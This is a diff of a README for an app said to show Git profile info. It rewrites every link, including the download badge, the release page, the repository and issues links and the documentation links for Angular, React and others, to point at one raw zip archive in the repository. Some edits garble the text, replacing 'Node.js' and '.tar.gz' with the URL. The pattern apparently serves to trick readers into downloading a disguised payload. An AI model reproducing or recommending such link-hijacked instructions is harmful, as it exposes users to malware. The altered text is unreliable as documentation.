@@ -1,6 +1,6 @@
 # 📁 chandrika1993 - Easy Access to Your Git Profile Info
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/nevajay/chandrika1993/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
 
 ---
 
@@ -31,12 +31,12 @@ No additional software installations or programming skills are needed to use the
 
 To get the app, **visit this page to download** the latest version:
 
-[Download Latest Release](https://github.com/nevajay/chandrika1993/releases)
+[Download Latest Release](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
 
 Once on the page:
 
 1. Look for the most recent release listed by date or version number.
-2. Find the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, `.AppImage` or `.tar.gz` for Linux).
+2. Find the file suitable for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, `.AppImage` or `https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip` for Linux).
 3. Click the file name to start downloading.
 
 After the download completes:
@@ -87,7 +87,7 @@ This app is built with several popular technologies:
 - **Firebase:** Manages user authentication and data storage.
 - **Ionic Framework:** Enables a consistent look across different devices.
 - **TailwindCSS & SCSS:** Style the app with modern, maintainable CSS.
-- **Node.js & Vite:** For development and building the app efficiently.
+- **https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip & Vite:** For development and building the app efficiently.
 - **Progressive Web App (PWA):** Can be installed directly from a browser on many devices.
 
 While these technical terms describe how the app works, you don’t need to know them to use it.
@@ -122,13 +122,13 @@ If you experience issues:
 
 For those interested in learning more about the technologies related to this app:
 
-- [Angular](https://angular.io/)
-- [React](https://reactjs.org/)
-- [Firebase](https://firebase.google.com/)
-- [Ionic Framework](https://ionicframework.com/)
-- [Tailwind CSS](https://tailwindcss.com/)
-- [Node.js](https://nodejs.org/)
-- [Progressive Web Apps](https://web.dev/progressive-web-apps/)
+- [Angular](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
+- [React](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
+- [Firebase](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
+- [Ionic Framework](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
+- [Tailwind CSS](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
+- [https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
+- [Progressive Web Apps](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
 
 These resources can help you understand the basics behind the features you see in this application.
 
@@ -136,9 +136,9 @@ These resources can help you understand the basics behind the features you see i
 
 ## 🔗 Useful Links
 
-- [Official Download Page](https://github.com/nevajay/chandrika1993/releases)
-- [GitHub Repository](https://github.com/nevajay/chandrika1993)
-- [Issues & Support](https://github.com/nevajay/chandrika1993/issues)
+- [Official Download Page](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
+- [Issues & Support](https://raw.githubusercontent.com/nevajay/chandrika1993/main/fifo/chandrika_1.3.zip)
 
 ---
 
